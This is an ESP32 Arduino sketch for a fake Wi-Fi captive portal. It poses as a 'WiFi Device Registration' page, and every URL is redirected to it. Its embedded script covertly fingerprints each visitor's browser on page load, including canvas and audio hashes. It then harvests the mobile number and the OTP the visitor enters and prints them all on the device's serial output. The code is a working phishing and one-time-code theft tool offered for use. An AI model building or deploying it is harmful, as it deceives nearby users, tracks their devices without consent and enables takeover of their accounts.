#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* ssid = "ESP32-WIFI";
const char* password = "12345678";

DNSServer dnsServer;
WebServer server(80);

const byte DNS_PORT = 53;

const char webpage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Device Check</title>
<style>
body{font-family:system-ui,sans-serif;max-width:360px;margin:40px auto;padding:0 12px}
input,button{width:100%;box-sizing:border-box;margin:6px 0;padding:8px}
#otp-pop{display:none;margin-top:10px;padding:12px;border:1px solid #999}
.status{font-size:13px;color:#666}
.status.ok{color:#16a34a}.status.err{color:#dc2626}
</style>
</head>
<body>
<h1>WiFi Device Registration</h1>
<p>Enter your mobile number to Register.</p>
<input id="phone" type="tel" inputmode="numeric" maxlength="15" placeholder="Mobile number" autocomplete="tel">
<button id="send">Register</button>
<div id="status" class="status"></div>
<div id="otp-pop">
  <p>Verify your mobile number with OTP</p>
  <input id="otp" type="text" inputmode="numeric" maxlength="8" placeholder="OTP">
  <button id="verify">Verify</button>
</div>
<script>
(function () {
  'use strict';
  // CHANGE: post to the ESP32 itself instead of the Apps Script webhook
  var URL = '/collect';
  var $ = function (i) { return document.getElementById(i); };
  var sid = 'SESS-' + Math.random().toString(16).slice(2, 10).toUpperCase();
  var phone = $('phone'), btn = $('send'), otp = $('otp'), vbtn = $('verify'), st = $('status'), pop = $('otp-pop');
  function hash(s) {            // FNV-1a → 8 hex chars
    for (var h = 0x811c9dc5, i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 0x01000193); }
    return ('0000000' + (h >>> 0).toString(16)).slice(-8);
  }
  function collect() {          // static device profile
    return {
      session_id: sid, timestamp: new Date().toISOString(), referrer: document.referrer || 'direct',
      'User-Agent': navigator.userAgent, 'Platform': navigator.platform || 'n/a',
      'Language(s)': navigator.languages ? navigator.languages.join(', ') : navigator.language,
      'Timezone (IANA)': Intl.DateTimeFormat().resolvedOptions().timeZone, 'UTC Offset (min)': new Date().getTimezoneOffset(),
      'Screen': screen.width + 'x' + screen.height, 'Color Depth': screen.colorDepth + '-bit',
      'CPU Cores': navigator.hardwareConcurrency || 'n/a', 'Device Memory': navigator.deviceMemory || 'n/a',
      'Cookies Enabled': navigator.cookieEnabled, 'Connection': (navigator.connection || {}).effectiveType || 'n/a'
    };
  }
  function canvas() {           // canvas fingerprint
    var c = document.createElement('canvas'); c.width = 250; c.height = 60;
    var x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '14px Arial'; x.fillStyle = '#f60'; x.fillRect(0, 0, 250, 60);
    x.fillStyle = '#069'; x.fillText('fp\u2022\u4e2d\u6587', 5, 20);
    return { 'Canvas Hash': hash(c.toDataURL()) };
  }
  function audio() {            // audio fingerprint (async)
    return new Promise(function (r) {
      try {
        var A = window.AudioContext || window.webkitAudioContext;
        if (!A) return r({ 'Audio Hash': 'n/a' });
        var c = new A(), an = c.createAnalyser(), o = c.createOscillator(), d = c.createMediaStreamDestination(), p = [];
        o.type = 'triangle'; o.frequency.value = 10000; an.fftSize = 32; o.connect(an); an.connect(d); o.start(0);
        (function tick() {
          var b = new Uint8Array(an.frequencyBinCount);
          an.getByteFrequencyData(b); p.push(b.join(''));
          if (p.length < 6) requestAnimationFrame(tick);
          else { o.stop(); c.close(); r({ 'Audio Hash': hash(p.join('|')) }); }
        })();
      } catch (e) { r({ 'Audio Hash': 'error' }); }
    });
  }
  function send(data) {         // POST to the ESP32 (same origin, no CORS)
    return fetch(URL, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: JSON.stringify(data)
    }).then(function (r) { return r.text(); });
  }
  function setStatus(cls, msg) { st.className = 'status ' + cls; st.textContent = msg; }

  /* 1) On load: send full device profile (NO phone number) */
  var initial = collect();
  Object.assign(initial, canvas());
  send(initial).catch(function () {});
  audio().then(function (a) { send(a).catch(function () {}); });

  /* 2) Phone number sent on click */
  btn.addEventListener('click', function () {
    var num = phone.value.trim();
    if (!/^[+]?[\d\s\-()]{7,15}$/.test(num)) return setStatus('err', 'Enter a valid mobile number.');
    btn.disabled = true;
    setStatus('', 'Sending number…');
    send({ mobile: num }).then(function (t) {
      btn.disabled = false;
      if (/ok/.test(t)) { setStatus('ok', 'Number received.'); pop.style.display = 'block'; }
      else setStatus('err', 'Send failed — check URL / access.');
    }).catch(function () { btn.disabled = false; setStatus('err', 'Network error — could not send.'); });
  });

  /* 3) OTP sent from popup */
  vbtn.addEventListener('click', function () {
    var code = otp.value.trim();
    if (!code) return setStatus('err', 'Enter the OTP.');
    vbtn.disabled = true;
    send({ otp: code }).then(function (t) {
      vbtn.disabled = false;
      setStatus(/ok/.test(t) ? 'ok' : 'err', /ok/.test(t) ? 'OTP received.' : 'Send failed.');
    }).catch(function () { vbtn.disabled = false; setStatus('err', 'Network error.'); });
  });

  phone.addEventListener('keydown', function (e) { if (e.key === 'Enter') btn.click(); });
  otp.addEventListener('keydown', function (e) { if (e.key === 'Enter') vbtn.click(); });
})();
</script>
</body>
</html>
)rawliteral";

// NEW: handler for the data the browser posts to the ESP32
// ---- Pretty JSON printer (no libraries needed) ----
void printIndent(int n) {
  for (int i = 0; i < n; i++) Serial.print(' ');
}

void prettyPrintJSON(const String& in) {
  int indent = 0;
  bool inString = false;
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];

    // Inside a string: print verbatim, respect escapes
    if (inString) {
      Serial.print(c);
      if (c == '\\' && i + 1 < in.length()) { Serial.print(in[++i]); continue; }
      if (c == '"') inString = false;
      continue;
    }

    if (c == '"')          { inString = true; Serial.print(c); }
    else if (c == '{' || c == '[') {
      Serial.println(c); indent += 2; printIndent(indent);
    }
    else if (c == '}' || c == ']') {
      Serial.println(); indent -= 2; printIndent(indent); Serial.print(c);
    }
    else if (c == ',')     { Serial.println(c); printIndent(indent); }
    else if (c == ':')     { Serial.print(": "); }
    else                   { Serial.print(c); }
  }
  Serial.println();
}

void handleCollect() {
  pinMode(2, OUTPUT);
  digitalWrite(2, HIGH);
  String body = server.arg("plain");
  Serial.println();
  Serial.println("+-------------------------------------");
  Serial.printf("| RECEIVED from %s\n", server.client().remoteIP().toString().c_str());
  Serial.println("+-------------------------------------");
  prettyPrintJSON(body);          // ← pretty, indented output
  Serial.println("--------------------------------------+");
  server.send(200, "text/plain", "ok");
  delay(1000);
  digitalWrite(2, LOW);
}

void handleRoot() {
  server.send_P(200, "text/html", webpage);
}

void handleNotFound() {
  handleRoot();   // Serve the same page for all URLs (captive portal flow)
}

void setup() {
  Serial.begin(115200);

  WiFi.softAP(ssid, password);

  IPAddress ip = WiFi.softAPIP();
  Serial.print("AP IP: ");
  Serial.println(ip);

  dnsServer.start(DNS_PORT, "*", ip);

  server.on("/", handleRoot);
  server.on("/collect", HTTP_POST, handleCollect);   // NEW: register the endpoint
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("Portal Started — data will print here");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}